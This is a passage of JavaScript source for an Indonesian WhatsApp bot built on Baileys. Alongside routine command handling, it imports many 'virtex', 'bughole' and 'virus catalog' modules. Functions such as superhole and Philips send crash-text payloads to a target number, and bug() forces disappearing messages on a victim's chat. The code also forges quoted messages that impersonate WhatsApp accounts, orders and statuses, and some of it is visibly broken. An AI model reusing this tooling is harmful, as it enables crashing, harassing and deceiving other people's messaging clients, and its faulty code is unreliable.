const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  RezoeectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const simple = require('./lib/simple.js')
//const { smsg } = require('./lib/simple')
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const yntkts = require('./src/settings.json')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const { latx, latx2 } = require('./database/latx')
const { virtex } = require('./hm/virtex')
const { virtex2 } = require('./hm/virtex2')
const { virtex3 } = require('./hm/virtex3')
const { virtex4 } = require('./hm/virtex4')
const { virtex5 } = require('./hm/virtex5')
const { virtex6 } = require('./hm/virtex6')
const { virtex7 } = require('./hm/virtex7')
const { virtex8 } = require('./hm/virtex8')
const { zoemods } = require('./hm/zoemods')
const { coba } = require('./hm/coba')
const { virtex9 } = require('./hm/virtex9')
const { ngazap } = require('./hm/ngazap')
const { virtag } = require('./hm/virtag')
const { emoji2 } = require('./hm/emoji2')
const { emoji3 } = require('./virtex/emoji3')
const { katalog } = require('./hm/katalog')
const { bugr } = require('./hm/bugr')
const { help } = require('./hm/help')
const { desk } = require('./hm/desk')
const { xixi } = require('./hm/xixi')
const { bugholes } = require('./virtex/bugholes')
const { viruscatalog } = require('./virtex/viruscatalog')
const { katalogv3 } = require('./virtex/katalogv3')
const { vweb9 } = require('./virtex/vweb9')
const { vweb8 } = require('./virtex/vweb8')
const { vweb7 } = require('./virtex/vweb7')
const { vweb6 } = require('./virtex/vweb6')
const { vweb5 } = require('./virtex/vweb5')
const { vweb4 } = require('./virtex/vweb4')
const { vweb3 } = require('./virtex/vweb3')
const { vweb2 } = require('./virtex/vweb2')
const { vweb1 } = require('./virtex/vweb1')
const { viper4 } = require('./virtex/viper4')
const { viper3 } = require('./virtex/viper3')
const { viper2 } = require('./virtex/viper2')
const { bugweb } = require('./hm/bugweb.js')
const { titik } = require('./hm/titik.js')
const { iphone } = require('./hm/iphone.js')
const { vapi } = require('./hm/vapi.js')
const { catalog } = require('./hm/catalog.js')
const { judul } = require('./hm/judul.js')
const { bughole } = require('./hm/bughole')
const { link1 } = require('./random/link1')
const { link2 } = require('./random/link2')
const { link3 } = require('./random/link3')
const { jadicatalog } = require('./src/jadicatalog')
 const { virtexctlgg } = require('./src/virtexctlgg')
const { virtexbyzoe } = require('./hm/virtexbyzoe')
const converter = require('./lib/converter.js')
const iye = fs.readFileSync('./logo.jpg')
const fake = fs.readFileSync('./logo.jpg')
const thumb = fs.readFileSync('./logo.jpg')
const bgg = fs.readFileSync('./logo.jpg')
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
virgam = fs.readFileSync(`./message/virgam.jpeg`)
virgamv4 = fs.readFileSync("./thumb/white.jpg")
virgamv5 = fs.readFileSync("./thumb/slemek.jpg")
virgamv6 = fs.readFileSync("./thumb/hzzz.jpg")
const { jadibut } = require('./hm/jadibot')

let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let setiker = JSON.parse(fs.readFileSync('./database/temp/stik.json'))
let ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
let imagenye = JSON.parse(fs.readFileSync('./database/temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/temp/video.json'))
let welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let autosticker = JSON.parse(fs.readFileSync('./src/autosticker.json'))
let antilinkig = JSON.parse(fs.readFileSync('./database/group/antilinkig.json'))
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))



//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
    

menusimpel = false
banChats = false;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = false;
autovn = false;
multi = true
harga = 20000
matauang = 'USD'
nopref = true
numbernye = '0'
autoketik = true;
prefixStatus = true;
const nomerOwner = '6285163999446'
const zixi = yntkts.zixi
const namabot = yntkts.namabot
const fakee = yntkts.fakee
const namaowner = yntkts.namaowner
const namadua = yntkts.namadua
const XChillDs = yntkts.XChillDs
const ZeksApi = yntkts.ZeksApi
const namatiga = yntkts.namatiga
const lolkey = yntkts.lolkey
ownerNumber = '6285163999446@s.whatsapp.net'
enter ='\n'
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};

module.exports = zoe = async (zoe, dev) => {
  try {
    if (!dev.hasNewMessage) return;
    dev = dev.messages.all()[0];
    if (!dev.message) return;
    if (dev.key && dev.key.remoteJid == "status@broadcast") return;
    global.blocked;
    dev.message =
      Object.keys(dev.message)[0] === "ephemeralMessage"
        ? dev.message.ephemeralMessage.message
        : dev.message;
const typei = Object.keys(dev.message)[0]
const type = Object.keys(dev.message)[0]
let _chats =
      type === "conversation" && dev.message.conversation
        ? dev.message.conversation
        : type == "imageMessage" && dev.message.imageMessage.caption
        ? dev.message.imageMessage.caption
        : type == "videoMessage" && dev.message.videoMessage.caption
        ? dev.message.videoMessage.caption
        : type == "extendedTextMessage" && dev.message.extendedTextMessage.text
        ? dev.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && dev.message[type].selectedButtonId
        ? dev.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(dev.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(dev.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(dev.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(dev.message);
    const from = dev.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? dev.message.conversation : (typei === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = zoe.user.jid;
    
    const botNumberss = zoe.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    function superhole(nomor){
for(let i=0;i < 1;i++){
let nyefir = areatext.barVir(prefix)
zoe.sendMessage(nomor, nyefir, MessageType.extendedText, {quoted: fdoc})
}
function bug(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
zoe.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
  }
  function Philips(nomor){
for(let i=0;i < 1;i++){
let nyelips = areatext.Philips(prefix)
zoe.sendMessage(nomor, nyelips, MessageType.extendedText, {quoted: fdoc})
}
  }const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
    const isWelkom = isGroup ? welkom.includes(from) : false
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await zoe.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await zoe.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await zoe.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await zoe.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await zoe.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await zoe.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = dev.key.fromMe
      ? zoe.user.jid
      : isGroup
      ? dev.participant
      : dev.key.remoteJid;
    let senderr = dev.key.fromMe
      ? zoe.user.jid
      : dev.key.remoteJid.endsWith("@g.us")
      ? dev.participant
      : dev.key.remoteJid;
    const totalchat = await zoe.chats.all();
    const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(zoe, dev);
    const groupMetadata = isGroup ? await zoe.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = dev.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = dev.key.fromMe
      ? zoe.user.jid
      : zoe.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = dev.key.fromMe
      ? zoe.user.name
      : conts.notify || conts.vname || conts.name || "-";
			
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "𝙒𝙖𝙞𝙩 𝘼 𝙈𝙞𝙣𝙪𝙩𝙚 シ︎",
      success: "𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹シ︎",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:v",
        apiz: "Nulisnya Jan Kepanjangan Erorkan",
        Iv: "Linknya error:v",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {
      zoe.sendMessage(from, teks, text, { quoted: dev });
    };*/
    const textImg = (teks) => {
           return ikyy.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./logo.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			zoe.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: dev, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6281314050985?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      zoe.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? zoe.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : zoe.sendMessage(from, teks.trim(), extendedText, {
            quoted: dev,
            contextInfo: { mentionedJid: memberr },
          });
    };
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "BODY BOTZ",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./logo.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./database/group/logo.jpg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
                      
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
  //GIF
  const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${pushname} ${pushname}`,
                 "h": `${pushname} ${pushname}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${pushname} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                     }  
                  }   
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `628551000185@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      zoe.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      zoe.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./database/group/logo.jpg"),
        quoted: dev,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      zoe.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
zoe.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		zoe.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            zoe.sendMessage(to, media, MessageType.sticker, { quoted: dev });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
